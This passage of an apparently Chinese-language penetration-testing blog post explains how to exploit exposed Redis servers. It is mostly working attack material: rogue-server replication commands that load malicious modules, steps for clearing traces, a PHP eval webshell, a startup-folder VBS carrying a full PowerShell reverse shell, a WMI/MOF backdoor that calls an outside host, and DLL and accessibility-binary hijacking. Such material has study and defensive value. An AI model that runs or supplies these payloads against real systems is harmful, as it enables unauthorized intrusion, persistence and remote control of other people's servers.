+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 被动模式</span><br><span class="hljs-comment"># （1）在 VPS 上启动使用此脚本模仿 redis 主服务器</span><br>python3 redis-rogue-server.py <span class="hljs-comment">--server-only</span><br><br><span class="hljs-comment"># （2）客户端设置主从备份，并进行 Module Load</span><br>config <span class="hljs-built_in">set</span> dir ./<br>config <span class="hljs-built_in">set</span> dbfilename <span class="hljs-built_in">exp</span>.so<br>slaveof <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-number">21000</span>  <span class="hljs-comment">#上面看绑定的服务段端口是21000</span><br>module <span class="hljs-built_in">load</span> ./<span class="hljs-built_in">exp</span>.so<br>slaveof no <span class="hljs-literal">one</span><br><span class="hljs-keyword">system</span>.exec <span class="hljs-string">&#x27;whoami&#x27;</span><br><br><span class="hljs-comment"># （3）清理痕迹</span><br>config <span class="hljs-built_in">set</span> dbfilename dump.rdb<br><span class="hljs-keyword">system</span>.exec <span class="hljs-string">&#x27;rm ./exp.so&#x27;</span><br>module <span class="hljs-built_in">unload</span> <span class="hljs-keyword">system</span><br><br><span class="hljs-comment"># 除了上面被动模式，也可以主动模式，攻击成功之后会得到一个交互式shell</span><br>python3 redis-rogue-server.py <span class="hljs-comment">--rhost &lt;target address&gt; --rport &lt;target port&gt; --lhost &lt;vps address&gt; --lport &lt;vps port&gt;</span><br><span class="hljs-comment"># --rpasswd 如果目标Redis服务开启了认证功能，可以通过该选项指定密码</span><br></code></pre></td></tr></table></figure>
+
+<p>第三种：<a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">Ridter&#x2F;redis-rce: Redis 4.x&#x2F;5.x RCE</a></p>
+<p>此仓库是 <a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a> 的修改版本。</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># 默认目标端口为 6379，默认 VPS 端口为 21000，攻击成功之后会得到一个交互式shell</span><br><span class="hljs-attribute">python3</span> redis-rce.py -r <span class="hljs-number">1.1.1.1</span> -L <span class="hljs-number">2.2.2.2</span> -f exp.so<br><span class="hljs-comment"># -a AUTH, --auth AUTH  redis password</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>第四种：<a target="_blank" rel="noopener" href="https://github.com/0671/RabR">0671&#x2F;RabR: Redis-Attack By Replication (通过主从复制攻击Redis)</a></p>
+<p>本工具基于Ridter师傅的<a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">redis-rce</a>进行修改。</p>
+<ul>
+<li>本工具利用这个Redis的脆弱性，对Linux下的Redis进行module攻击、crontab写入攻击和ssh公钥写入攻击，对Windows下的Redis进行module攻击和dll劫持攻击。</li>
+<li>本工具默认使用的Linux恶意模块：exp&#x2F;linux&#x2F;exp.so，源码来自于：<a target="_blank" rel="noopener" href="https://github.com/puckiestyle/RedisModules-ExecuteCommand">rsa_keyRedisModules-ExecuteCommandrsa_key </a>, 该模块实现了执行单条命令和反弹shell的功能，你也可以编写自己的模块。</li>
+<li>本工具默认使用的crontab文件：exp&#x2F;linux&#x2F;exp.crontab，使用前务必根据自己实际的需求进行修改，或者直接通过命令行设置自己的crontab文件。</li>
+<li>本工具默认使用的ssh公钥文件：exp&#x2F;linux&#x2F;exp.authorized_keys，使用前务必自己重新生成以替换，或者直接通过命令行设置自己的ssh公钥文件。</li>
+<li>本工具默认使用的Windows恶意模块：exp&#x2F;win&#x2F;exp.dll，源码来自于：<a target="_blank" rel="noopener" href="https://github.com/0671/RedisModules-ExecuteCommand-for-Windows">rsa_keyRedisModules-ExecuteCommand-for-Windowsrsa_key </a>, 该模块实现了执行命令的功能，你也可以编写自己的模块。</li>
+<li>本工具默认使用的用于劫持的恶意dll：exp&#x2F;win&#x2F;dbghelp.dll，是通过 <a target="_blank" rel="noopener" href="https://github.com/kiwings/DLLHijacker">rsa_keyDLLHijackerrsa_key </a>+ rsa_keyWinx64下的dbghelp.dllrsa_key编译生成的，该dll会执行calc，你也可以编译自己的dbghelp.dll。</li>
+<li>本工具有爆破功能，默认密码字典位于pwd.txt中，也可自定义字典文件。</li>
+<li>本工具在攻击前会备份目标Redis的数据，在攻击结束后会进行恢复，使用的工具为<a target="_blank" rel="noopener" href="https://github.com/yannh/redis-dump-go">rsa_keyredis-dump-gorsa_key</a>。默认是开启的，可以关闭。</li>
+</ul>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">用法: python redis-attack.py [-h] -r RHOST [-p RPORT] -L LHOST [-P LPORT] [-wf WINFILE] [-wf WINFILE2] [-lf LINUXFILE] [-lf2 LINUXFILE2] [-lf3 LINUXFILE3] [-<span class="hljs-keyword">a</span> AUTH] [<span class="hljs-comment">--brute] [-v]</span><br>示例:<br>    python redis-attack.py -r <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.234</span> -L <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> <span class="hljs-comment">--brute</span><br>    python redis-attack.py -r <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.234</span> -L <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> -P <span class="hljs-number">80</span> -b mypwd.txt -i<br>    python redis-attack.py -r <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.234</span> -L <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> -lf3 id_rsa.pub<br><br>可选参数:<br>  -h, <span class="hljs-comment">--help            显示帮助信息并退出</span><br>  -r RHOST, <span class="hljs-comment">--rhost RHOST</span><br>                        目标主机<br>  -p RPORT, <span class="hljs-comment">--rport RPORT</span><br>                        目标 Redis 端口，默认<span class="hljs-number">6379</span><br>  -L LHOST, <span class="hljs-comment">--lhost LHOST</span><br>                        Rogue Server 的 IP<br>  -P LPORT, <span class="hljs-comment">--lport LPORT</span><br>                        Rogue Server 监听端口，默认<span class="hljs-number">16379</span><br>  -wf WINFILE, <span class="hljs-comment">--winfile WINFILE</span><br>                        用于劫持 Redis 的 DLL，默认 <span class="hljs-built_in">exp</span>/win/dbghelp.dll<br>  -wf2 WINFILE2, <span class="hljs-comment">--winfile2 WINFILE2</span><br>                        需要加载的 RedisModules（Windows），默认 <span class="hljs-built_in">exp</span>/win/<span class="hljs-built_in">exp</span>.dll<br>  -lf LINUXFILE, <span class="hljs-comment">--linuxfile LINUXFILE</span><br>                        需要加载的 RedisModules（Linux），默认 <span class="hljs-built_in">exp</span>/linux/<span class="hljs-built_in">exp</span>.so<br>  -lf2 LINUXFILE2, <span class="hljs-comment">--linuxfile2 LINUXFILE2</span><br>                        用于攻击 Linux 的 Crontab 文件（/var/spool/cron/root），默认 <span class="hljs-built_in">exp</span>/linux/<span class="hljs-built_in">exp</span>.crontab（使用前需要修改）<br>  -lf3 LINUXFILE3, <span class="hljs-comment">--linuxfile3 LINUXFILE3</span><br>                        用于攻击 Linux 的 SSH id_rsa.pub 文件（/root/.ssh/authorized_keys），可用 `ssh-keygen -t rsa` 生成，默认 <span class="hljs-built_in">exp</span>/linux/<span class="hljs-built_in">exp</span>.authorized_keys（空文件，使用前需修改）<br>  -<span class="hljs-keyword">a</span> AUTH, <span class="hljs-comment">--auth AUTH</span><br>                        Redis 密码<br>  -b [BRUTE], <span class="hljs-comment">--brute [BRUTE]</span><br>                        如果 Redis 需要密码认证，则进行暴力破解，默认字典为 pwd.txt<br>  -i, <span class="hljs-comment">--idontcare</span><br>                        不关心目标 Redis 上的数据<br>  -v, <span class="hljs-comment">--verbose</span><br>                        显示更多信息<br></code></pre></td></tr></table></figure>
+
+<p>第五种：<a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile">r35tart&#x2F;RedisWriteFile: 通过 Redis 主从写出无损文件</a></p>
+<p>此脚本是通过 <code>Redis</code> 主从写出无损文件，可用于 <code>Windows</code> 平台下写出无损的 <code>EXE</code>、<code>DLL</code>、 <code>LNK</code> 和 <code>Linux</code> 下的 <code>OS</code> 等二进制文件</p>
+<p>或者MDUT也可以主从同步</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152220178.png" srcset="/img/loading.gif" lazyload alt="image-20250806201155258"></p>
+<h3 id="禁用-config-命令绕过"><a href="#禁用-config-命令绕过" class="headerlink" title="禁用 config 命令绕过"></a>禁用 config 命令绕过</h3><p>管理员可以通过以下命令来禁用 config 命令，</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">CONFIG</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>这样的话我们就无法自定义路径和文件名了，但是这并不影响主从复制的利用，我们还是可以利用主从复制把 so 文件丢过去，只是由于无法自定义路径和文件名，所以我们的 so 文件传过去后会会变为 dump.rdb，直接利用通过以下方法正常加载还是能 RCE：</p>
+<figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-built_in">module</span> <span class="hljs-built_in">load</span> /data/<span class="hljs-built_in">dump</span>.rdb<br></code></pre></td></tr></table></figure>
+
+<p><strong>注意：</strong>&#x2F;data&#x2F;dump.rdb 为 redis 数据库文件默认路径</p>
+<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>微软官方的Redis在Windows上只支持到3.2.100和3.0.504（参考<a target="_blank" rel="noopener" href="https://github.com/microsoftarchive/redis">microsoftarchive&#x2F;redis</a>），更高版本的Windows Redis都是第三方的，这也是实战中Windows服务器上的Redis很多是3.2.100和3.0.504的原因。</p>
+<p>Windows上主要有下面几种打法：</p>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>利用要求</th>
+<th>利用方法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Webshell</td>
+<td>Administrator能直接写，普通用户看运气，Network Service权限写不了。要有web且知道路径</td>
+<td>有IIS服务的情况下，可以尝试往C:&#x2F;inetpub&#x2F;wwwroot&#x2F;写Webshell，其他Web服务要猜目录</td>
+</tr>
+<tr>
+<td>启动项</td>
+<td>Administrator能直接写，普通用户需要猜用户名，Network Service权限写不了。必须要重启机器（用户登录）才能生效</td>
+<td>比如往startup目录写启动项</td>
+</tr>
+<tr>
+<td>MOF</td>
+<td>要System权限才能写，且是win2003</td>
+<td>将后门写在nullevt.mof中，默认5秒会执行一次</td>
+</tr>
+<tr>
+<td>主从同步+动态库加载</td>
+<td>无权限要求，但3.x的Redis并没有模块加载的功能，需要redis 4.x或者redis 5.x</td>
+<td>4.x之后的Redis允许用户加载自定义dll，可用主从复制写入恶意DLL，直接加载执行</td>
+</tr>
+<tr>
+<td>system文件劫持</td>
+<td>要System权限才能写，或关掉NT6（Vista&#x2F;7&#x2F;8&#x2F;8.1&#x2F;10&#x2F;11） 及以上操作系统的 UAC</td>
+<td>比如把cmd.exe覆写到<code>sethc.exe</code> &#x2F; <code>utilman.exe</code> &#x2F; <code>osk.exe</code> 等辅助功能程序，在RDP登录界面调出命令行</td>
+</tr>
+<tr>
+<td>DLL劫持</td>
+<td>无权限要求</td>
+<td>劫持dbghelp.dll，主从复制写入恶意DLL并通过Redis命令触发</td>
+</tr>
+<tr>
+<td>其他花式</td>
+<td>Administrator能直接写，普通用户需要猜用户名，Network Service权限写不了</td>
+<td>比如写一个exe马，再整个快捷方式伪装一下放到桌面上，等运维人员打开</td>
+</tr>
+</tbody></table>
+<h3 id="写-Webshell"><a href="#写-Webshell" class="headerlink" title="写 Webshell"></a>写 Webshell</h3><p><strong>利用条件</strong></p>
+<p>Web目录写马条件比较苛刻，首先这台机器上要有Web，其次还要有机会泄露Web的绝对路径</p>
+<p>这是 getshell 成功率较高的办法了。</p>
+<p><strong>利用过程</strong></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"># C:/inetpub/wwwroot/ 是Windows IIS（Internet Information Services）默认的网站根目录</span><br><span class="language-xml"># C:\PhPstudy\phpstudy_pro\WWW、C:\phpStudy\PHPTutorial\WWW是phpstudy可能的目录</span><br><span class="language-xml"></span><br><span class="language-xml">flushall</span><br><span class="language-xml">config set dir C:\phpStudy\PHPTutorial\WWW</span><br><span class="language-xml">config set dbfilename log.php</span><br><span class="language-xml">set shell &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;x&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="写启动项"><a href="#写启动项" class="headerlink" title="写启动项"></a>写启动项</h3><p><strong>利用条件</strong></p>
+<ul>
+<li>用户名得爆破，且爆破成功得机率很低，而且 Administrator 用户不一定存在（大部分时候为具有 Administrator 权限的自定义用户）</li>
+<li>必须要重启机器（用户登录）才能生效。所以这个利用比较鸡肋，因为 Windows Server 的话是很少关机的，如果没有 BDoS 漏洞的话，我们得等待对方重启，payload 才能执行；</li>
+</ul>
+<p><strong>利用过程</strong></p>
+<p>和Linux不太相同，Windows的自启动有几类：系统服务、计划任务、注册表启动项、用户的startup目录。其中前三种是无法通过单纯向某目录中写文件实现精准篡改的，因此只有startup目录可以利用</p>
+<p>往下面目录写入 VBS、Powershell、Exe：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># startup目录典型路径</span><br>C:\Users\&lt;用户名&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\<br><span class="hljs-comment"># 或者所有用户</span><br>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\<br><br><br><span class="hljs-comment"># 大致打法：</span><br><span class="hljs-comment"># 1. 将Redis的默认备份目录修改为启动目录（以所有用户启动目录为例）</span><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> <span class="hljs-string">&quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&quot;</span><br><span class="hljs-comment"># 2. 将备份文件名修改为一个有迷惑性的名称，比如 &quot;shell.vbs&quot;或者&quot;shell.bat&quot;</span><br>config <span class="hljs-built_in">set</span> dbfilename <span class="hljs-string">&quot;shell.vbs&quot;</span><br><span class="hljs-comment"># 3. 将shell.vbs的完整内容写入Redis的一个键中（注意：内容需要是一行，不能有换行）</span><br><span class="hljs-built_in">set</span> x <span class="hljs-string">&quot;Set shell = WScript.CreateObject(\&quot;</span>Wscript.Shell\<span class="hljs-string">&quot;)\r\nshell.Run \&quot;</span>cmd.exe /c powershell <span class="hljs-literal">-NoP</span> <span class="hljs-literal">-NonI</span> <span class="hljs-literal">-W</span> <span class="hljs-keyword">Hidden</span> <span class="hljs-literal">-Exec</span> Bypass <span class="hljs-literal">-Command</span> \<span class="hljs-string">&quot;\&quot;</span>\<span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&#x27;192.168.1.100&#x27;</span>,<span class="hljs-number">4444</span>);\<span class="hljs-variable">$stream</span> = \<span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]\<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((\<span class="hljs-variable">$i</span> = \<span class="hljs-variable">$stream</span>.Read(\<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, \<span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;\<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(\<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, \<span class="hljs-variable">$i</span>);\<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> \<span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );\<span class="hljs-variable">$sendback2</span> = \<span class="hljs-variable">$sendback</span> + <span class="hljs-string">&#x27;PS &#x27;</span> + (<span class="hljs-built_in">pwd</span>).Path + <span class="hljs-string">&#x27;&gt; &#x27;</span>;\<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(\<span class="hljs-variable">$sendback2</span>);\<span class="hljs-variable">$stream</span>.Write(\<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,\<span class="hljs-variable">$sendbyte</span>.Length);\<span class="hljs-variable">$stream</span>.Flush()&#125;;\<span class="hljs-variable">$client</span>.Close()\<span class="hljs-string">&quot;\&quot;</span>\<span class="hljs-string">&quot;, 0, True&quot;</span><br><span class="hljs-comment"># 4. 执行save命令，将Redis内存中的数据（包含我们的恶意脚本）保存到刚才设置的dbfilename文件（shell.vbs）中</span><br>save<br></code></pre></td></tr></table></figure>
+
+<p>如果管理员将 Redis 添加了服务项并配了一个高权限（如Administrator甚至SYSTEM），那么 Administrator 账户的路径就一定可写了。</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">python3 RedisWriteFile.py <span class="hljs-operator">-</span>-rhost<span class="hljs-operator">=</span><span class="hljs-number">192.168</span>.<span class="hljs-number">52.192</span> <span class="hljs-operator">-</span>-lhost<span class="hljs-operator">=</span><span class="hljs-number">192.168</span>.<span class="hljs-number">52.128</span> <span class="hljs-operator">-</span>-rpath<span class="hljs-operator">=</span><span class="hljs-string">&quot;C:<span class="hljs-char escape_">\U</span>sers<span class="hljs-char escape_">\A</span>dministrator<span class="hljs-char escape_">\A</span>ppData<span class="hljs-char escape_">\R</span>oaming<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows<span class="hljs-char escape_">\S</span>tart Menu<span class="hljs-char escape_">\P</span>rograms<span class="hljs-char escape_">\S</span>tartup&quot;</span> <span class="hljs-operator">-</span>-rfile<span class="hljs-operator">=</span>exp.vbs <span class="hljs-operator">-</span>-lfile<span class="hljs-operator">=</span>log.vbs<br></code></pre></td></tr></table></figure>
+
+<h3 id="MOF"><a href="#MOF" class="headerlink" title="MOF"></a>MOF</h3><p><strong>利用条件</strong></p>
+<ul>
+<li>system权限</li>
+<li>win2003</li>
+</ul>
+<p>如果目标机器是win2003那就比较幸运了，不用再被动等待人为操作了。 </p>
+<p>托管对象格式 (MOF)  文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">C:</span><span class="hljs-keyword">/windows/</span>system32<span class="hljs-keyword">/wbem/</span>mof/nullevt.mof<br></code></pre></td></tr></table></figure>
+
+<p>其作用是每隔五秒就会去监控进程创建和死亡。但这个默认5秒执行一次的设定只有win2003及以下系统才会有……</p>
+<p>例如如下脚本（WMI永久后门）：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><br>instance of __EventFilter as <span class="hljs-variable">$EventFilter</span> <br>&#123; <br>    EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>; <br>    Name  = <span class="hljs-string">&quot;filtP2&quot;</span>; <br>    Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span> <br>            <span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span> <br>            <span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>; <br>    QueryLanguage = <span class="hljs-string">&quot;WQL&quot;</span>; <br>&#125;; <br><br>instance of ActiveScriptEventConsumer as <span class="hljs-variable">$Consumer</span> <br>&#123; <br>    Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>; <br>    ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>; <br>    ScriptText = <br>    <span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;);\nWSH.run(\&quot;</span>powershell <span class="hljs-literal">-windowstyle</span> <span class="hljs-keyword">hidden</span> <span class="hljs-literal">-Command</span> \\\<span class="hljs-string">&quot;<span class="hljs-variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;1.2.3.4&#x27;,4444);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[byte[]]<span class="hljs-variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, 0, <span class="hljs-variable">$bytes</span>.Length)) -ne 0)&#123;; <span class="hljs-variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,0,<span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (iex <span class="hljs-variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="hljs-variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,0,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()\\\&quot;</span>\<span class="hljs-string">&quot;);&quot;</span>; <br>&#125;; <br><br>instance of __FilterToConsumerBinding <br>&#123; <br>    Consumer   = <span class="hljs-variable">$Consumer</span>; <br>    <span class="hljs-keyword">Filter</span> = <span class="hljs-variable">$EventFilter</span>; <br>&#125;;<br><br></code></pre></td></tr></table></figure>
+
+<p>将其保存为nullevt.mof并写入<code>C:/windows/system32/wbem/mof</code>路径下，而且由于win2003没有默认UAC的控制，只要权限够就可以直接写入。</p>
+<p>写入后几秒钟脚本就会执行（反弹shell），执行成功会放在good文件夹，失败放在bad文件夹</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python3 RedisWriteFile.py <span class="hljs-attribute">--rhost</span>=192.168.52.192 <span class="hljs-attribute">--lhost</span>=192.168.52.128 <span class="hljs-attribute">--rpath</span>=<span class="hljs-string">&quot;C:\windows\system32\wbem\mof&quot;</span> <span class="hljs-attribute">--rfile</span>=nullevt.mof <span class="hljs-attribute">--lfile</span>=nullevt.mof<br></code></pre></td></tr></table></figure>
+
+<h3 id="主从复制配合动态库加载-1"><a href="#主从复制配合动态库加载-1" class="headerlink" title="主从复制配合动态库加载"></a>主从复制配合动态库加载</h3><p><strong>利用条件</strong></p>
+<ul>
+<li>redis 4.x或者redis 5.x</li>
+</ul>
+<p>Redis 3.x版本并不支持模块加载功能（主从同步RCE需要关键模块MODULE LOAD，这个是redis4.0之后才有的），因此基于主从同步进行RCE不可行——因为无法加载DLL模块。</p>
+<p>虽然微软对 Windows 版 Redis 的更新停留在了 3.x，但是也有其它第三方团队针对 Windows 平台做了 Redis 的适配，例如这个项目，直接适配到了 5.x 版本：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/tporadowski/redis">tporadowski&#x2F;redis: Native port of Redis for Windows. Redis is an in-memory database that persists on disk. The data model is key-value, but many different kind of values are supported: Strings, Lists, Sets, Sorted Sets, Hashes, Streams, HyperLogLogs. This repository contains unofficial port of Redis to Windows.</a></p>
+<p>所以，即使是 Windows 平台，只要版本为 4.x 或 5.x ，同样可以进行 Module Load 直接 RCE。</p>
+<p>主从复制配合 Module Load 与 Linux 步骤一致，只是文件不能是 so 文件了，而得是 Windows 平台的 DLL，DLL 项目源码如下：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/0671/RedisModules-ExecuteCommand-for-Windows">0671&#x2F;RedisModules-ExecuteCommand-for-Windows: 可在Windows下执行系统命令的Redis模块，可用于Redis主从复制攻击。</a></p>
+<p><strong>利用过程</strong></p>
+<p>以此工具为例：<a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile">r35tart&#x2F;RedisWriteFile: 通过 Redis 主从写出无损文件</a></p>
+<p>（1）先把 DLL 传递过去</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">python3 RedisWriteFile.py <span class="hljs-attribute">--rhost</span>=192.168.52.204 <span class="hljs-attribute">--lhost</span>=192.168.52.128 <span class="hljs-attribute">--rpath</span>=<span class="hljs-string">&quot;.&quot;</span> <span class="hljs-attribute">--rfile</span>=exp.dll <span class="hljs-attribute">--lfile</span>=exp.dll<br></code></pre></td></tr></table></figure>
+
+<p>（2）执行命令</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1:6379</span>&gt; module load exp.dll<br><span class="hljs-number">127.0.0.1:6379</span>&gt; exp.e whoami<br><span class="hljs-number">127.0.0.1:6379</span>&gt; exp.e net user<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="system文件劫持"><a href="#system文件劫持" class="headerlink" title="system文件劫持"></a>system文件劫持</h3><p><strong>利用条件</strong></p>
+<ul>
+<li>Redis 以 SYSTEM 权限运行（注意：不是 Administrator，而是要 SYSTEM）</li>
+<li>UAC 彻底关闭</li>
+</ul>
+<p>这个利用点<strong>几乎不可能</strong>在实战中用到，因为需要管理员或者SYSTEM权限，这里主要指的是通过写文件覆盖已有的文件或劫持DLL以达到欺骗的目的，虽然还是被动等待上线（比如把cmd.exe覆写到<code>sethc.exe</code> &#x2F; <code>utilman.exe</code> &#x2F; <code>osk.exe</code> 等辅助功能程序，在RDP登录界面调出命令行），但概率明显要比等机器重启要高得多。比较通用的方法是向 system32 目录下写文件，但 NT6（Vista&#x2F;7&#x2F;8&#x2F;8.1&#x2F;10&#x2F;11） 及以上操作系统的 UAC 必须关掉，或 Redis 以 SYSTEM 权限启动，否则脚本显示成功但实际上是无法写入的。</p>
+<p>而在 Windows 中，管理员常用的，有两种方式使程序以 <strong>SYSTEM 权限</strong>运行：</p>
+<ul>
+<li>利用 Windows 自带的任务计划程序，计划任务默认以 SYSTEM 权限运行程序</li>
